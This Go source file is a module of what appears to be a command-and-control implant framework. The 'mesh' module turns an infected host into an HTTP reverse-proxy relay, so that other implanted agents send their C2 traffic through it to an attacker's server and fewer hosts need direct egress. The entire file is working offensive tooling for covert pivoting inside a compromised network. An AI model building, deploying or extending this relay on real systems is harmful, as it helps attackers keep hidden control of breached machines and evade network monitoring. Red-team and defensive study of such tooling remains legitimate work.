/*
Copyright © 2023 MOHAMMED YASIN

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package modules

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strconv"
	"strings"
	"sync"

	"github.com/sirupsen/logrus"
)

// meshRelay is a single running C2 reverse proxy listener.
type meshRelay struct {
	listener net.Listener
	upstream *url.URL
}

// Mesh implements a self-contained P2P relay: child agents route their C2
// traffic through a parent agent's HTTP reverse proxy, reducing the number
// of hosts with direct egress to the C2 server.
type Mesh struct {
	mu     sync.Mutex
	relays map[int]*meshRelay // keyed by bound port
}

func NewMesh() *Mesh {
	return &Mesh{relays: make(map[int]*meshRelay)}
}

func (m *Mesh) Name() string       { return "mesh" }
func (m *Mesh) Platform() []string { return []string{"linux", "windows", "darwin"} }

func (m *Mesh) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	action := args["action"]
	if action == "" {
		action = "listen"
	}

	switch action {
	case "listen":
		return m.listen(args)
	case "peers", "list":
		return m.list()
	case "stop":
		return m.stop(args)
	default:
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("unknown action: %s (valid: listen, peers, stop)", action),
		}, nil
	}
}

func (m *Mesh) listen(args map[string]string) (*Result, error) {
	portStr := args["port"]
	if portStr == "" {
		portStr = "8888"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 0 {
		return nil, fmt.Errorf("invalid port: %s", portStr)
	}

	server := args["server"]
	if server == "" {
		return nil, fmt.Errorf("listen requires server argument (C2 base URL, e.g. https://c2:443)")
	}
	upstream, err := url.Parse(server)
	if err != nil {
		return nil, fmt.Errorf("invalid server URL: %w", err)
	}
	if upstream.Scheme == "" || upstream.Host == "" {
		return nil, fmt.Errorf("invalid server URL: %s", server)
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	if m.relays == nil {
		m.relays = make(map[int]*meshRelay)
	}

	// Already running on this exact port and upstream: idempotent.
	if relay, ok := m.relays[port]; ok && relay.upstream.String() == upstream.String() {
		return &Result{
			Success: true,
			Output: fmt.Sprintf("mesh relay already listening on %s -> %s\n"+
				"child agents: set ServerURL to http://<this-host>:%d\n",
				relay.listener.Addr().String(), upstream.String(), port),
		}, nil
	}

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("listen on port %d failed: %v", port, err),
		}, nil
	}
	boundPort := listener.Addr().(*net.TCPAddr).Port

	proxy := httputil.NewSingleHostReverseProxy(upstream)
	relay := &meshRelay{listener: listener, upstream: upstream}
	m.relays[boundPort] = relay

	go func() {
		if err := http.Serve(listener, proxy); err != nil && err != http.ErrServerClosed {
			// A deliberate stop closes the listener, which surfaces as an
			// accept error; log those at debug rather than warn.
			if isClosedConnError(err) {
				logrus.Debugf("mesh relay on %s stopped", listener.Addr().String())
			} else {
				logrus.Warnf("mesh relay on %s stopped: %v", listener.Addr().String(), err)
			}
		}
		m.mu.Lock()
		delete(m.relays, boundPort)
		m.mu.Unlock()
	}()

	return &Result{
		Success: true,
		Output: fmt.Sprintf("mesh relay listening on %s -> %s\n"+
			"child agents: set ServerURL to http://<this-host>:%d\n"+
			"stop with action=stop port=%d\n",
			listener.Addr().String(), upstream.String(), boundPort, boundPort),
	}, nil
}

func (m *Mesh) list() (*Result, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if len(m.relays) == 0 {
		return &Result{
			Success: true,
			Output:  "no active mesh relays (start one with action=listen server=<c2-url> port=<port>)\n",
		}, nil
	}

	var sb strings.Builder
	sb.WriteString("active mesh relays (port -> upstream):\n")
	for port, relay := range m.relays {
		fmt.Fprintf(&sb, "  %d -> %s (%s)\n", port, relay.upstream.String(), relay.listener.Addr().String())
	}
	return &Result{
		Success: true,
		Output:  sb.String(),
	}, nil
}

func (m *Mesh) stop(args map[string]string) (*Result, error) {
	portStr := args["port"]
	if portStr == "" {
		portStr = "8888"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return nil, fmt.Errorf("invalid port: %s", portStr)
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	relay, ok := m.relays[port]
	if !ok {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("no mesh relay running on port %d", port),
		}, nil
	}

	if err := relay.listener.Close(); err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("close relay on port %d failed: %v", port, err),
		}, nil
	}
	delete(m.relays, port)

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("mesh relay on port %d stopped\n", port),
	}, nil
}

// isClosedConnError reports whether err stems from a listener we closed
// ourselves (a deliberate relay stop).
func isClosedConnError(err error) bool {
	if err == nil {
		return false
	}
	msg := err.Error()
	return strings.Contains(msg, "use of closed network connection") ||
		strings.Contains(msg, "closed")
}
